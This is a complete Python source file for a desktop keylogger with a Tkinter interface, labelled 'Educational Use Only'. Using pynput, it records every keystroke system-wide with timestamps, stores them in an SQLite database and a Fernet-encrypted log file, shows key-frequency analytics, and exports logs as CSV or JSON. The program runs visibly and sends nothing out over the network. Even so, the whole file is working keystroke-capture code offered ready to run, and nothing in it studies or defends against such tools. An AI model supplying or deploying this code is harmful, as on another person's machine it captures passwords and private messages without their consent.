import os
import sqlite3
import datetime
import csv
import json
import queue
from collections import Counter
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import threading

# --------- Configuration ----------
DB_PATH = "keylogs.db"
LOG_FILE_PATH = "log.enc"
KEY_FILE = "secret.key"
POLL_INTERVAL_MS = 200  # GUI polling interval for queue/analytics
# ---------------------------------

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger (Educational Use Only)")
        self.root.geometry("800x600")

        # state
        self.is_logging = False
        self.is_paused = False
        self.listener = None
        self.queue = queue.Queue()
        self.key_counter = Counter()

        # encryption
        self.key = self._load_or_create_key(KEY_FILE)
        self.cipher = Fernet(self.key)

        # setup DB
        self._setup_database()

        # build GUI
        self._build_gui()

        # periodic UI update
        self._poll_queue()

    # ---------------- persistence ----------------
    def _load_or_create_key(self, path):
        if not os.path.exists(path):
            k = Fernet.generate_key()
            with open(path, "wb") as f:
                f.write(k)
            return k
        with open(path, "rb") as f:
            return f.read()

    def _setup_database(self):
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute(
            """CREATE TABLE IF NOT EXISTS logs (
                   id INTEGER PRIMARY KEY AUTOINCREMENT,
                   timestamp TEXT NOT NULL,
                   key TEXT NOT NULL
               )"""
        )
        conn.commit()
        conn.close()

    # ---------------- GUI ----------------
    def _build_gui(self):
        style = ttk.Style(self.root)
        try:
            style.theme_use("clam")
        except Exception:
            pass

        notebook = ttk.Notebook(self.root)
        frame_logger = ttk.Frame(notebook)
        frame_analytics = ttk.Frame(notebook)
        notebook.add(frame_logger, text="Logger")
        notebook.add(frame_analytics, text="Analytics")
        notebook.pack(expand=True, fill="both")

        # Logger tab
        self.status_label = ttk.Label(frame_logger, text="Logging: OFF", foreground="red", font=("Arial", 12))
        self.status_label.pack(pady=8)

        self.log_display = tk.Text(frame_logger, height=20, width=90, wrap="word", state="normal")
        self.log_display.pack(side="left", padx=(8,0), pady=8, fill="both", expand=True)
        scrollbar = ttk.Scrollbar(frame_logger, command=self.log_display.yview)
        scrollbar.pack(side="right", fill="y", pady=8)
        self.log_display.configure(yscrollcommand=scrollbar.set)

        btn_frame = ttk.Frame(frame_logger)
        btn_frame.pack(pady=10)

        self.start_btn = ttk.Button(btn_frame, text="Start Logging", command=self.start_logging, width=18)
        self.start_btn.grid(row=0, column=0, padx=4, pady=4)
        self.pause_btn = ttk.Button(btn_frame, text="Pause Logging", command=self.toggle_pause, width=18)
        self.pause_btn.grid(row=0, column=1, padx=4, pady=4)
        self.stop_btn = ttk.Button(btn_frame, text="Stop Logging", command=self.stop_logging, width=18)
        self.stop_btn.grid(row=0, column=2, padx=4, pady=4)
        self.clear_btn = ttk.Button(btn_frame, text="Clear Logs", command=self.clear_logs, width=18)
        self.clear_btn.grid(row=1, column=0, padx=4, pady=4)
        self.export_csv_btn = ttk.Button(btn_frame, text="Export CSV", command=lambda: self.export_logs("csv"), width=18)
        self.export_csv_btn.grid(row=1, column=1, padx=4, pady=4)
        self.export_json_btn = ttk.Button(btn_frame, text="Export JSON", command=lambda: self.export_logs("json"), width=18)
        self.export_json_btn.grid(row=1, column=2, padx=4, pady=4)
        self.exit_btn = ttk.Button(btn_frame, text="Exit", command=self.on_exit, width=18)
        self.exit_btn.grid(row=2, column=1, padx=4, pady=8)

        # Analytics tab
        analytics_label = ttk.Label(frame_analytics, text="Real-Time Analytics", font=("Arial", 14))
        analytics_label.pack(pady=8)
        self.analytics_display = tk.Text(frame_analytics, height=30, width=90, wrap="word", state="normal")
        self.analytics_display.pack(padx=8, pady=8)
        export_analytics_btn = ttk.Button(frame_analytics, text="Export Analytics", command=self.export_analytics)
        export_analytics_btn.pack(pady=6)

    # ---------------- logging & listener ----------------
    def _on_press(self, key):
        """Runs on listener thread. Put events into queue for main thread processing."""
        if self.is_paused:
            return
        try:
            key_str = str(key).replace("'", "")
        except Exception:
            key_str = "<unknown>"
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # push tuple (timestamp, key_str)
        self.queue.put((timestamp, key_str))

    def start_logging(self):
        if self.is_logging:
            return
        try:
            self.listener = Listener(on_press=self._on_press)
            self.listener.start()  # non-blocking
            self.is_logging = True
            self.is_paused = False
            self.status_label.config(text="Logging: ON", foreground="green")
            self.pause_btn.config(text="Pause Logging")
        except Exception as e:
            messagebox.showerror("Error", f"Could not start listener:\n{e}")

    def stop_logging(self):
        if not self.is_logging:
            return
        try:
            if self.listener:
                self.listener.stop()
                self.listener = None
            self.is_logging = False
            self.status_label.config(text="Logging: OFF", foreground="red")
        except Exception as e:
            messagebox.showerror("Error", f"Error stopping listener:\n{e}")

    def toggle_pause(self):
        if not self.is_logging:
            return
        self.is_paused = not self.is_paused
        self.pause_btn.config(text="Resume Logging" if self.is_paused else "Pause Logging")

    # ---------------- queue processing (main thread) ----------------
    def _poll_queue(self):
        """Called by root.after periodically to process queue and update GUI/DB."""
        processed = False
        while not self.queue.empty():
            try:
                timestamp, key_str = self.queue.get_nowait()
            except queue.Empty:
                break
            processed = True
            # update counters and DB & encrypted file
            self.key_counter[key_str] += 1
            self._save_to_db(timestamp, key_str)
            self._append_encrypted_file(timestamp, key_str)
            # update GUI display (safe because we're in main thread)
            self.log_display.insert(tk.END, f"[{timestamp}] - {key_str}\n")
            self.log_display.see(tk.END)
        if processed:
            self._update_analytics_display()
        # schedule next poll
        self.root.after(POLL_INTERVAL_MS, self._poll_queue)

    def _save_to_db(self, timestamp, key_str):
        try:
            conn = sqlite3.connect(DB_PATH)
            cur = conn.cursor()
            cur.execute("INSERT INTO logs (timestamp, key) VALUES (?, ?)", (timestamp, key_str))
            conn.commit()
            conn.close()
        except Exception as e:
            print("DB write error:", e)

    def _append_encrypted_file(self, timestamp, key_str):
        try:
            entry = f"[{timestamp}] - {key_str}"
            enc = self.cipher.encrypt(entry.encode())
            with open(LOG_FILE_PATH, "ab") as f:
                f.write(enc + b"\n")
        except Exception as e:
            print("File write error:", e)

    # ---------------- analytics & exports ----------------
    def _update_analytics_display(self):
        total = sum(self.key_counter.values())
        most_common = self.key_counter.most_common(10)
        self.analytics_display.delete(1.0, tk.END)
        self.analytics_display.insert(tk.END, f"Total Keys: {total}\n\nMost Frequent Keys:\n")
        for k, v in most_common:
            self.analytics_display.insert(tk.END, f"{k}: {v}\n")

    def export_logs(self, fmt="csv"):
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT id, timestamp, key FROM logs ORDER BY id")
        rows = cur.fetchall()
        conn.close()
        if not rows:
            messagebox.showinfo("Export", "No logs to export.")
            return

        if fmt == "csv":
            file = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files","*.csv")])
            if file:
                with open(file, "w", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow(["ID", "Timestamp", "Key"])
                    writer.writerows(rows)
                messagebox.showinfo("Export", "CSV exported successfully.")
        elif fmt == "json":
            file = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files","*.json")])
            if file:
                data = [{"ID": r[0], "Timestamp": r[1], "Key": r[2]} for r in rows]
                with open(file, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                messagebox.showinfo("Export", "JSON exported successfully.")

    def export_analytics(self):
        if not self.key_counter:
            messagebox.showinfo("Export", "No analytics available.")
            return
        file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files","*.txt")])
        if file:
            total = sum(self.key_counter.values())
            with open(file, "w", encoding="utf-8") as f:
                f.write(f"Total Keys: {total}\n\nMost Frequent Keys:\n")
                for k, v in self.key_counter.most_common(20):
                    f.write(f"{k}: {v}\n")
            messagebox.showinfo("Export", "Analytics exported successfully.")

    # ---------------- utilities ----------------
    def clear_logs(self):
        if not messagebox.askyesno("Confirm", "Delete all logs from database, encrypted file, and analytics?"):
            return
        try:
            conn = sqlite3.connect(DB_PATH)
            cur = conn.cursor()
            cur.execute("DELETE FROM logs")
            conn.commit()
            conn.close()
        except Exception as e:
            print("DB clear error:", e)

        try:
            if os.path.exists(LOG_FILE_PATH):
                os.remove(LOG_FILE_PATH)
        except Exception as e:
            print("File delete error:", e)

        self.key_counter.clear()
        self.log_display.delete(1.0, tk.END)
        self.analytics_display.delete(1.0, tk.END)
        messagebox.showinfo("Cleared", "Logs and analytics cleared.")

    def on_exit(self):
        if messagebox.askyesno("Exit", "Exit application?"):
            # stop listener if running
            try:
                if self.listener:
                    self.listener.stop()
            except Exception:
                pass
            self.root.destroy()

# ---------------- run app ----------------
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
